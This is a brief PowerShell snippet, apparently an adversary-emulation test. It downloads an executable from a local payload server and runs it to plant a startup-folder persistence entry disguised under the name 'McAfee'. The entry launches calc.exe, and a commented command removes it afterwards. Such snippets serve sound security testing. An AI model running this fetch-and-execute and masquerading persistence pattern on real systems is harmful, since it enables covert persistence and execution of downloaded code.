Invoke-WebRequest -Uri "127.0.0.1:3344/payloads/helpmestartup.exe" -OutFile "C:\temp\helpmestartup.exe";Invoke-Expression -command "C:\temp\helpmestartup.exe -t startupfolder -c 'C:\Windows\System32\cmd.exe' -a '/c calc.exe' -f 'McAfee' -m add";

#Removal Command:
#Invoke-Expression -command "C:\temp\helpmestartup.exe  -t startupfolder -f 'McAfee' -m remove";